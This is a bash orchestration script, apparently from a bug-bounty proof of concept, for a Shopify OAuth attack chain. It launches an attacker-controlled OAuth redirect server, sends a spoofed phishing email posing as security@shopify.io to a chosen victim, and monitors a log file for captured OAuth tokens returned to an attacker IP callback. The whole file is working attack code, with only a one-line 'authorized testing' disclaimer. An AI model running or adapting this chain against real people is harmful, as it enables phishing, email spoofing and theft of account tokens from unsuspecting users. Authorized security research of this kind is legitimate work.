#!/usr/bin/env bash
#
# chain.sh - Shopify OAuth Chain POC: Full Attack Chain Orchestrator
#
# This script ties together the complete attack chain:
#   1. Starts the OAuth redirect server (oauth_redirect.py)
#   2. Waits for it to be ready and listening
#   3. Sends the spoofed phishing email (send_phish.py)
#   4. Monitors the log file for captured data
#
# USAGE:
#   ./chain.sh <target_email> [--attacker-ip YOUR_IP] [--port 5000]
#
# EXAMPLE:
#   ./chain.sh victim@example.com --attacker-ip 203.0.113.10
#
# REQUIREMENTS:
#   - Python 3.7+
#   - Flask (pip install flask)
#   - dnspython (pip install dnspython) [optional, for MX resolution]
#
# AUTHOR: xbyteid (HackerOne)
# DISCLAIMER: For authorized bug bounty testing only.

set -euo pipefail

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="/tmp/oauth_tokens.log"
PORT=5000
ATTACKER_IP=""
TARGET_EMAIL=""
SERVER_PID=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# ---------------------------------------------------------------------------
# Functions
# ---------------------------------------------------------------------------

cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    if [[ -n "$SERVER_PID" ]] && kill -0 "$SERVER_PID" 2>/dev/null; then
        echo -e "${YELLOW}[*] Stopping OAuth redirect server (PID: $SERVER_PID)${NC}"
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    echo -e "${GREEN}[+] Cleanup complete.${NC}"
}

usage() {
    echo "Usage: $0 <target_email> [options]"
    echo ""
    echo "Options:"
    echo "  --attacker-ip IP    Your public IP (default: auto-detect)"
    echo "  --port PORT         OAuth server port (default: 5000)"
    echo ""
    echo "Example:"
    echo "  $0 victim@example.com --attacker-ip 203.0.113.10"
    exit 1
}

auto_detect_ip() {
    # Try multiple methods to detect public IP
    local ip=""
    ip=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null) || \
    ip=$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null) || \
    ip=$(curl -s --max-time 5 https://icanhazip.com 2>/dev/null) || \
    ip=$(hostname -I 2>/dev/null | awk '{print $1}') || \
    ip="127.0.0.1"
    echo "$ip"
}

wait_for_server() {
    local max_attempts=30
    local attempt=0

    echo -e "${BLUE}[*] Waiting for OAuth redirect server to be ready...${NC}"
    while [[ $attempt -lt $max_attempts ]]; do
        if curl -s --max-time 2 "http://127.0.0.1:${PORT}/" >/dev/null 2>&1; then
            echo -e "${GREEN}[+] OAuth redirect server is ready on port ${PORT}${NC}"
            return 0
        fi
        attempt=$((attempt + 1))
        sleep 1
    done

    echo -e "${RED}[!] ERROR: OAuth redirect server failed to start within ${max_attempts}s${NC}"
    return 1
}

monitor_log() {
    echo ""
    echo -e "${PURPLE}[!] Monitoring ${LOG_FILE} for captured data...${NC}"
    echo -e "${PURPLE}[!] Press Ctrl+C to stop${NC}"
    echo ""

    # Create log file if it doesn't exist
    touch "$LOG_FILE"

    # Follow the log file
    tail -f "$LOG_FILE" 2>/dev/null &
    local tail_pid=$!

    # Wait for Ctrl+C
    trap "kill $tail_pid 2>/dev/null; cleanup; exit 0" INT TERM
    wait $tail_pid 2>/dev/null || true
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

main() {
    # Parse arguments
    if [[ $# -lt 1 ]]; then
        usage
    fi

    TARGET_EMAIL="$1"
    shift

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --attacker-ip)
                ATTACKER_IP="$2"
                shift 2
                ;;
            --port)
                PORT="$2"
                shift 2
                ;;
            -h|--help)
                usage
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${NC}"
                usage
                ;;
        esac
    done

    # Auto-detect IP if not provided
    if [[ -z "$ATTACKER_IP" ]]; then
        echo -e "${BLUE}[*] Auto-detecting public IP...${NC}"
        ATTACKER_IP=$(auto_detect_ip)
        echo -e "${GREEN}[+] Detected IP: ${ATTACKER_IP}${NC}"
    fi

    # Set up cleanup trap
    trap cleanup EXIT

    # Banner
    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║   Shopify OAuth Chain POC — Email Spoof + Token Theft   ║${NC}"
    echo -e "${PURPLE}║                     by xbyteid                           ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Target:${NC}        ${TARGET_EMAIL}"
    echo -e "${BLUE}Attacker IP:${NC}   ${ATTACKER_IP}"
    echo -e "${BLUE}Server Port:${NC}   ${PORT}"
    echo -e "${BLUE}Callback URL:${NC}  http://${ATTACKER_IP}:${PORT}/callback"
    echo -e "${BLUE}Log File:${NC}      ${LOG_FILE}"
    echo ""

    # Clear old log data
    > "$LOG_FILE"

    # -----------------------------------------------------------------------
    # Step 1: Start the OAuth redirect server
    # -----------------------------------------------------------------------
    echo -e "${YELLOW}[Step 1] Starting OAuth redirect server...${NC}"
    python3 "${SCRIPT_DIR}/oauth_redirect.py" \
        --attacker-ip "$ATTACKER_IP" \
        --port "$PORT" &
    SERVER_PID=$!
    echo -e "${GREEN}[+] OAuth redirect server started (PID: ${SERVER_PID})${NC}"

    # -----------------------------------------------------------------------
    # Step 2: Wait for server to be ready
    # -----------------------------------------------------------------------
    if ! wait_for_server; then
        echo -e "${RED}[!] Failed to start OAuth redirect server. Exiting.${NC}"
        exit 1
    fi

    # -----------------------------------------------------------------------
    # Step 3: Send the spoofed phishing email
    # -----------------------------------------------------------------------
    echo ""
    echo -e "${YELLOW}[Step 2] Sending spoofed phishing email...${NC}"
    python3 "${SCRIPT_DIR}/send_phish.py" \
        "$TARGET_EMAIL" \
        --sender-ip "$ATTACKER_IP"

    echo ""
    echo -e "${GREEN}[+] Attack chain deployed!${NC}"
    echo -e "${GREEN}[+] Spoofed email sent from security@shopify.io to ${TARGET_EMAIL}${NC}"
    echo -e "${GREEN}[+] OAuth redirect server listening on http://${ATTACKER_IP}:${PORT}${NC}"
    echo ""

    # -----------------------------------------------------------------------
    # Step 4: Monitor for captured data
    # -----------------------------------------------------------------------
    monitor_log
}

main "$@"
